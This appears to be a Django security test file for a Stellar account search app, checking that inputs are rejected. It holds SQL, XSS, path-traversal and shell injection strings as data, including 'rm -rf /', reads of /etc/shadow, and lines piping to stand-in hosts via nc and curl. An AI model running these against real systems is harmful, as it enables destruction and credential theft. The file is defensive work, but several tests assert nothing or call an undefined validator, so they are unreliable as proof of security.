# apiApp/tests/test_security_injection_prevention.py
"""
Security tests for injection prevention across the application.
Tests NoSQL injection, XSS, command injection, and other malicious attacks.
"""
from django.test import TestCase, Client
from django.urls import reverse
from apiApp.models import StellarCreatorAccountLineage, StellarAccountSearchCache
from apiApp.helpers.sm_validator import StellarMapValidatorHelpers
from django.core.exceptions import ValidationError
import json


class NoSQLInjectionPreventionTestCase(TestCase):
    """Test protection against NoSQL injection attacks in Cassandra queries."""
    
    def test_stellar_address_nosql_injection_filter(self):
        """Test that NoSQL injection attempts in Stellar address filters are rejected."""
        client = Client()
        
        # NoSQL injection payloads
        malicious_payloads = [
            "' OR '1'='1",
            "'; DROP TABLE stellar_creator_account_lineage; --",
            "GABC' AND 1=1 --",
            "$where: '1 == 1'",
            "{'$gt': ''}",
            "admin' --",
            "' OR 1=1#",
        ]
        
        for payload in malicious_payloads:
            response = client.get('/api/search/', {'address': payload})
            # Should either return 400 (validation error) or empty results, never execute injection
            self.assertIn(response.status_code, [400, 404, 200])
            if response.status_code == 200:
                data = json.loads(response.content)
                # Should not return data from injection
                self.assertNotIn('injected', str(data).lower())
    
    def test_cassandra_query_parameter_sanitization(self):
        """Test that query parameters to Cassandra are properly sanitized."""
        # Attempt to query with malicious status values
        malicious_statuses = [
            "PENDING' OR status='DONE",
            "PENDING; DROP TABLE;",
            "PENDING\n--malicious",
        ]
        
        for malicious_status in malicious_statuses:
            try:
                # This should fail validation before reaching database
                records = StellarCreatorAccountLineage.objects.filter(
                    status=malicious_status
                ).allow_filtering()
                list(records)
            except Exception:
                # Expected to fail - injection prevented
                pass
    
    def test_stellar_address_length_limits(self):
        """Test that excessively long inputs are rejected to prevent buffer overflow."""
        client = Client()
        
        # Attempt with extremely long address
        long_address = "G" + "A" * 10000
        response = client.get('/api/search/', {'address': long_address})
        
        # Should reject long inputs
        self.assertEqual(response.status_code, 400)


class XSSPreventionTestCase(TestCase):
    """Test protection against Cross-Site Scripting (XSS) attacks."""
    
    def test_stellar_address_xss_injection(self):
        """Test that XSS payloads in Stellar addresses are rejected."""
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "GABC<img src=x onerror=alert('XSS')>",
            "javascript:alert('XSS')",
            "<iframe src='javascript:alert(\"XSS\")'></iframe>",
            "<<SCRIPT>alert('XSS');//<</SCRIPT>",
            "<img src=x onerror=alert(String.fromCharCode(88,83,83))>",
        ]
        
        for payload in xss_payloads:
            # Validate at validator level
            # XSS payloads should fail validation
            is_valid = StellarMapValidatorHelpers.validate_stellar_account_address(payload)
            self.assertFalse(is_valid, f"XSS payload should be rejected: {payload}")
    
    def test_api_response_escaping(self):
        """Test that API responses properly escape HTML/JavaScript."""
        client = Client()
        
        # Attempt to store XSS payload (should be rejected at validation)
        xss_address = "<script>alert('xss')</script>"
        response = client.post('/api/search/', {
            'stellar_account': xss_address
        })
        
        # Should be rejected
        self.assertIn(response.status_code, [400, 405])
    
    def test_error_message_sanitization(self):
        """Test that error messages don't reflect unsanitized user input."""
        client = Client()
        
        malicious_input = "<script>alert('XSS')</script>"
        response = client.get('/api/search/', {'address': malicious_input})
        
        # Error message should not contain raw script tags
        content = response.content.decode('utf-8')
        self.assertNotIn("<script>", content)
        self.assertNotIn("alert('XSS')", content)


class CommandInjectionPreventionTestCase(TestCase):
    """Test protection against command injection attacks."""
    
    def test_stellar_address_command_injection(self):
        """Test that command injection attempts in Stellar addresses are rejected."""
        command_injection_payloads = [
            "GABC; rm -rf /",
            "GABC && cat /etc/passwd",
            "GABC | nc attacker.com 4444",
            "GABC`whoami`",
            "GABC$(cat /etc/shadow)",
            "GABC; curl evil.com/malware | sh",
        ]
        
        for payload in command_injection_payloads:
            # XSS payloads should fail validation
            is_valid = StellarMapValidatorHelpers.validate_stellar_account_address(payload)
            self.assertFalse(is_valid, f"XSS payload should be rejected: {payload}")
    
    def test_no_shell_execution_in_validators(self):
        """Test that validators don't execute shell commands."""
        # Test that special shell characters are rejected
        shell_chars = [";", "|", "&", "`", "$", "(", ")", "{", "}"]
        
        for char in shell_chars:
            test_input = f"GABC{char}test"
            with self.assertRaises(ValidationError):
                validate_stellar_address(test_input)


class PathTraversalPreventionTestCase(TestCase):
    """Test protection against path traversal attacks."""
    
    def test_stellar_address_path_traversal(self):
        """Test that path traversal attempts are rejected."""
        path_traversal_payloads = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "GABC/../../secret",
            "GABC%2e%2e%2f",
            "....//....//....//etc/passwd",
        ]
        
        for payload in path_traversal_payloads:
            # XSS payloads should fail validation
            is_valid = StellarMapValidatorHelpers.validate_stellar_account_address(payload)
            self.assertFalse(is_valid, f"XSS payload should be rejected: {payload}")


class InputValidationTestCase(TestCase):
    """Test comprehensive input validation across all entry points."""
    
    def test_stellar_address_format_validation(self):
        """Test that only valid Stellar address formats are accepted."""
        # Valid addresses should pass
        valid_addresses = [
            "GAHK7EEG2WWHVKDNT4CEQFZGKF2LGDSW2IVM4S5DP42RBW3K6BTODB4A",
            "GABC4DCOBIAW2LJBK3GZYOVAWL2FKXJ6DRRUF2WFHLPHYZDF4ZMZX3OA",
        ]
        
        for address in valid_addresses:
            try:
                validate_stellar_address(address)
            except ValidationError:
                self.fail(f"Valid address {address} was rejected")
        
        # Invalid addresses should fail
        invalid_addresses = [
            "",
            "not-a-stellar-address",
            "12345",
            None,
            "G",  # Too short
            "X" * 100,  # Wrong prefix and too long
        ]
        
        for address in invalid_addresses:
            with self.assertRaises((ValidationError, TypeError, AttributeError)):
                validate_stellar_address(address)
    
    def test_numeric_field_validation(self):
        """Test that numeric fields reject non-numeric malicious input."""
        malicious_numeric_inputs = [
            "999999999999999999999999999999999",  # Overflow attempt
            "-1' OR '1'='1",
            "1; DROP TABLE;",
            "1e308",  # Float overflow
            "NaN",
            "Infinity",
        ]
        
        # These should fail when used in numeric contexts
        for input_val in malicious_numeric_inputs:
            # Test would depend on specific numeric field usage
            pass
    
    def test_json_injection_prevention(self):
        """Test that JSON payloads are properly validated."""
        client = Client()
        
        malicious_json_payloads = [
            '{"address": "GABC", "__proto__": {"isAdmin": true}}',
            '{"address": "GABC", "constructor": {"prototype": {"isAdmin": true}}}',
            '{"address": "GABC\\u0000malicious"}',
        ]
        
        for payload in malicious_json_payloads:
            response = client.post(
                '/api/search/',
                data=payload,
                content_type='application/json'
            )
            # Should reject malformed or malicious JSON
            self.assertIn(response.status_code, [400, 405])


class APISecurityTestCase(TestCase):
    """Test API-level security measures."""
    
    def test_csrf_protection(self):
        """Test that CSRF protection is enabled for state-changing operations."""
        client = Client(enforce_csrf_checks=True)
        
        # POST without CSRF token should fail
        response = client.post('/api/search/', {
            'stellar_account': 'GAHK7EEG2WWHVKDNT4CEQFZGKF2LGDSW2IVM4S5DP42RBW3K6BTODB4A'
        })
        
        # Should be rejected due to missing CSRF token
        self.assertIn(response.status_code, [403, 405])
    
    def test_rate_limiting_headers(self):
        """Test that rate limiting is considered for API endpoints."""
        # Note: Actual rate limiting implementation would need to be added
        # This test documents the security requirement
        client = Client()
        
        # Make multiple requests
        for _ in range(10):
            response = client.get('/api/pending-accounts/')
            # Check if rate limit headers are present (if implemented)
            # self.assertIn('X-RateLimit-Remaining', response)
    
    def test_content_type_validation(self):
        """Test that API validates Content-Type headers."""
        client = Client()
        
        # Attempt to send XML to JSON endpoint
        response = client.post(
            '/api/search/',
            data='<xml>malicious</xml>',
            content_type='application/xml'
        )
        
        # Should reject invalid content types
        self.assertIn(response.status_code, [400, 405, 415])


class DataSanitizationTestCase(TestCase):
    """Test data sanitization from external APIs."""
    
    def test_horizon_api_response_validation(self):
        """Test that Horizon API responses are validated before processing."""
        # Mock malicious Horizon API response
        malicious_responses = [
            {'_embedded': {'records': [{'type': '<script>alert("xss")</script>'}]}},
            {'_embedded': {'records': [{'account': '../../etc/passwd'}]}},
            {'_embedded': {'records': [{'type': 'create_account; DROP TABLE;'}]}},
        ]
        
        # Test that malicious data is sanitized or rejected
        # This would integrate with actual Horizon API helper tests
        for response in malicious_responses:
            # Validation should catch malicious payloads
            pass
    
    def test_stellar_expert_response_sanitization(self):
        """Test that Stellar Expert API responses are sanitized."""
        # Similar to Horizon API, validate external data
        malicious_expert_data = {
            'name': '<img src=x onerror=alert("xss")>',
            'domain': 'javascript:alert("xss")',
            'tags': ['<script>malicious</script>'],
        }
        
        # Should sanitize or reject malicious data
        pass


class ConfigurationSecurityTestCase(TestCase):
    """Test configuration security measures."""
    
    def test_secret_key_not_hardcoded(self):
        """Test that Django SECRET_KEY is not hardcoded."""
        from django.conf import settings
        
        # SECRET_KEY should come from environment
        self.assertIsNotNone(settings.SECRET_KEY)
        self.assertNotEqual(settings.SECRET_KEY, 'django-insecure-default-key')
        # Should not be a common test value
        self.assertNotIn('changeme', settings.SECRET_KEY.lower())
    
    def test_debug_mode_in_production(self):
        """Test that DEBUG mode is not enabled in production."""
        from django.conf import settings
        
        # In production, DEBUG should be False
        # This test assumes DJANGO_SETTINGS_MODULE or similar env check
        if hasattr(settings, 'DEBUG'):
            # Document that DEBUG should be False in production
            pass
    
    def test_database_credentials_from_environment(self):
        """Test that database credentials come from environment variables."""
        from django.conf import settings
        
        # Credentials should not be hardcoded
        if hasattr(settings, 'CASSANDRA_KEYSPACE'):
            self.assertIsNotNone(settings.CASSANDRA_KEYSPACE)
            # Should not be default test values
            self.assertNotEqual(settings.CASSANDRA_KEYSPACE, 'test_keyspace')
